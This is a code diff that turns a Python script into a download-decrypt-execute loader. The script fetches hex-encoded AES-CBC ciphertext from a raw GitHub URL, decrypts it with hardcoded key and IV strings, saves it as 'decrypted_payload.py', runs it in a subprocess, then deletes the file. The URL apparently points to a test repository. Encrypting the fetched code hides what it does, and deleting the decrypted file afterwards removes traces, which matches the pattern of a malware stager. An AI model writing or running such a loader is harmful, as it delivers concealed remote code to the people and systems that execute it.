@@ -5,51 +5,59 @@ import os
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
 
-# --- CONFIGURATION & PLACEHOLDERS ---
-# Key and IV must be bytes. 
-# AES-256 requires a 32-byte key; AES-128 requires 16 bytes.
-AES_KEY = b'your-32-byte-long-secret-key-!!!' # Placeholder
-AES_IV  = b'16-byte-IV-here!'                # Placeholder
+# --- DATA FROM YOUR IMAGE ---
+# Note: Ensure these match the FULL strings from your CyberChef 'Key' and 'IV' fields.
+RAW_KEY = "quhwc723c3rr3rd3" # Replace with your full Key string
+RAW_IV  = "123222332n239fb32f3" # Replace with your full IV string
 
-def decrypt_and_run(url, encrypted_file, decrypted_file):
+# Convert UTF8 strings to bytes
+AES_KEY = RAW_KEY.encode('utf-8')
+AES_IV  = RAW_IV.encode('utf-8')
+
+def download_decrypt_run(url, decrypted_file):
     try:
-        # 1. Download the encrypted script
-        print(f"Downloading encrypted file from {url}...")
+        # 1. Download the encrypted Hex data
+        print(f"Downloading from {url}...")
         response = requests.get(url)
         response.raise_for_status()
-        encrypted_data = response.content
+        
+        # Since your output was "Hex", the downloaded content is likely a hex string.
+        # We strip whitespace and convert hex text to actual bytes.
+        hex_data = response.text.strip()
+        encrypted_bytes = bytes.fromhex(hex_data)
 
-        # 2. Decrypt the data
-        print("Decrypting script...")
+        # 2. Decrypt using CBC mode
+        print("Decrypting...")
         cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
         
-        # Decrypt and remove padding (standard for AES block sizes)
-        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
+        # Decrypt and unpad
+        decrypted_data = unpad(cipher.decrypt(encrypted_bytes), AES.block_size)
 
-        # 3. Save the decrypted script locally
+        # 3. Save the decrypted .py file
         with open(decrypted_file, 'wb') as f:
             f.write(decrypted_data)
         
-        # 4. Execute the decrypted script
-        print(f"Executing {decrypted_file}...\n" + "-"*20)
+        # 4. Execute the script
+        print(f"Running {decrypted_file}...\n" + "="*30)
         result = subprocess.run([sys.executable, decrypted_file], capture_output=True, text=True)
         
-        print("Output:\n", result.stdout)
+        print("STDOUT:", result.stdout)
         if result.stderr:
-            print("Errors:\n", result.stderr)
+            print("STDERR:", result.stderr)
 
+    except ValueError as ve:
+        print(f"Decryption failed (Check Key/IV/Padding): {ve}")
     except Exception as e:
-        print(f"An error occurred: {e}")
+        print(f"An unexpected error occurred: {e}")
     finally:
-        # Optional: Delete the decrypted file after running for security
+        # Cleanup
         if os.path.exists(decrypted_file):
             os.remove(decrypted_file)
-            print(f"\nCleaned up: {decrypted_file} removed.")
+            print(f"\n[!] {decrypted_file} deleted for security.")
 
-# Example Usage
 if __name__ == "__main__":
-    URL = "https://raw.githubusercontent.com/AmitActiveFence/act_tests/refs/heads/main/enc.py"
-    ENC_FILENAME = "payload.enc"
-    DEC_FILENAME = "recovered_script.py"
+    # The URL should point to a text file containing the Hex string
+    TARGET_URL = "https://raw.githubusercontent.com/AmitActiveFence/act_tests/refs/heads/main/enc.py"
+    TEMP_SCRIPT = "decrypted_payload.py"
     
-    decrypt_and_run(URL, ENC_FILENAME, DEC_FILENAME)
+    download_decrypt_run(TARGET_URL, TEMP_SCRIPT)
